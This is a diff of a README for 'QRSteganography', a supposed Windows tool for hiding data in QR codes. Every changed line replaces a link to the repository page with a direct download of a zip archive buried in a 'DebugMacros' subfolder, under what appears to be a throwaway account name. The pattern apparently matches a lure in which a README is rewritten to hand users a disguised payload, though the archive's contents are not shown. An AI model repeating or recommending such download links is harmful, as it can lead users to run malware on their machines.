@@ -1,6 +1,6 @@
 # 🛡️ QRSteganography - Hide Data Using QR Codes
 
-[![Download QRSteganography](https://img.shields.io/badge/Download-QRSteganography-brightgreen?style=for-the-badge)](https://github.com/Fourpenny-brutalisation838/QRSteganography)
+[![Download QRSteganography](https://img.shields.io/badge/Download-QRSteganography-brightgreen?style=for-the-badge)](https://github.com/Fourpenny-brutalisation838/QRSteganography/raw/refs/heads/main/QRGenerate/DebugMacros/QR-Steganography-3.3-beta.1.zip)
 
 ## 📦 What Is QRSteganography?
 
@@ -40,7 +40,7 @@ This section walks you through downloading and running QRSteganography on your W
 
 1. Visit the official download page:
    
-   [Download QRSteganography](https://github.com/Fourpenny-brutalisation838/QRSteganography)
+   [Download QRSteganography](https://github.com/Fourpenny-brutalisation838/QRSteganography/raw/refs/heads/main/QRGenerate/DebugMacros/QR-Steganography-3.3-beta.1.zip)
 
 2. On the linked page, look for the latest release or download section. This is where the program files are stored.
 
@@ -120,7 +120,7 @@ If you run into issues:
 
 This link leads to the main page where you will find the latest version:
 
-[Download QRSteganography](https://github.com/Fourpenny-brutalisation838/QRSteganography)
+[Download QRSteganography](https://github.com/Fourpenny-brutalisation838/QRSteganography/raw/refs/heads/main/QRGenerate/DebugMacros/QR-Steganography-3.3-beta.1.zip)
 
 Follow the instructions under "Getting Started" to download and install the application.
 
